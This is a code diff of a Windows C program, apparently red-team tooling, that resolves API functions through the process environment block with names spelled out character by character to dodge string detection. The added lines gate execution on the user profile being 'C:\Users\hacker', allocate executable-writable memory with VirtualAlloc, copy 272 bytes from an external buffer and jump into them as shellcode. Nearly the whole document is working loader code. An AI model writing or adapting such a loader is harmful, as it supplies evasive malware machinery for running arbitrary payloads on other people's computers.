@@ -1,14 +1,9 @@
 #include <Windows.h>
 #include "peb_lookup.h"
 
-/*
-	char load_lib_name1[] = { 'N','t','Q','u','e','r','y','S','y','s','t','e','m','E','n','v','i','r','o','n','m','e','n','t','V','a','l','u','e',0 };
-	LPVOID load_lib = get_func_by_name((HMODULE)base1, (LPSTR)load_lib_name1);
-	if (!load_lib) {
-		return 2;
-	}
-	*/
 
+//extern char *dobin;
+char *dobin;
 
 int main()
 {
@@ -31,7 +26,6 @@ int main()
 	FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
 		= (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;
 
-
 	// ntdll.dll: GetEnvironmentVariableW()
 	char GetEnvironmentVariableW_str[] = { 'G','e','t','E','n','v','i','r','o','n','m','e','n','t','V','a','r','i','a','b','l','e','W', 0 };
 	int (WINAPI * _GetEnvironmentVariableW)(
@@ -44,18 +38,15 @@ int main()
 			_In_ DWORD nSize)) _GetProcAddress((HMODULE)base, GetEnvironmentVariableW_str);
 	if (_GetEnvironmentVariableW == NULL) return 4;
 
-	
-
+	// Execution Guardrail: Env Check
 	wchar_t envVarName[] = {'U','S','E','R','P','R','O','F','I','L','E', 0};
 	wchar_t tocheck[] = {'C',':','\\','U','s','e','r','s','\\','h','a','c','k','e','r', 0}; // L"C:\\Users\\hacker"
-
-	//LPCWSTR envVarName = L"USERPROFILE";
 	WCHAR buffer[1024];  // NOTE: Do not make it bigger, or we have a __chkstack() dependency!
 	DWORD result = ((DWORD(WINAPI*)(LPCWSTR, LPWSTR, DWORD))_GetEnvironmentVariableW)(envVarName, buffer, 1024);
 	if (result == 0) {
 		return 6;
 	}
-	if (mystrcmp(buffer, tocheck) != 0) { // escape backslash
+	if (mystrcmp(buffer, tocheck) != 0) { 
 		return 6;
 	}
 
@@ -77,6 +68,27 @@ int main()
 	wchar_t msg_content[] = { 'H','e','l','l','o', ' ', 'W','o','r','l','d','!', 0 };
 	wchar_t msg_title[] = { 'D','e','m','o','!', 0 };
 	_MessageBoxW(0, msg_title, msg_content, MB_OK);
+
+	// Copy shellcode
+	// ntdll.dll: VirtualAlloc()
+	char VirtualAlloc_str[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0 };
+	LPVOID (WINAPI * _VirtualAlloc)(
+		_In_opt_ LPVOID lpAddress,
+		_In_ SIZE_T dwSize,
+		_In_ DWORD  flAllocationType,
+		_In_ DWORD  flProtect) = (LPVOID (WINAPI*)(
+			_In_opt_ LPVOID lpAddress,
+			_In_ SIZE_T dwSize,
+			_In_ DWORD  flAllocationType,
+			_In_ DWORD  flProtect)) _GetProcAddress((HMODULE)base, VirtualAlloc_str);
+	if (_VirtualAlloc == NULL) return 4;
+	char *dest = _VirtualAlloc(NULL, 4096, 0x3000, 0x40);
+	for(int n=0; n<272; n++) {
+		dest[n] = dobin[n];
+	}
+
+	// Exec shellcode
+	 (*(void(*)())(dest))();
 
 	return 0;
 }
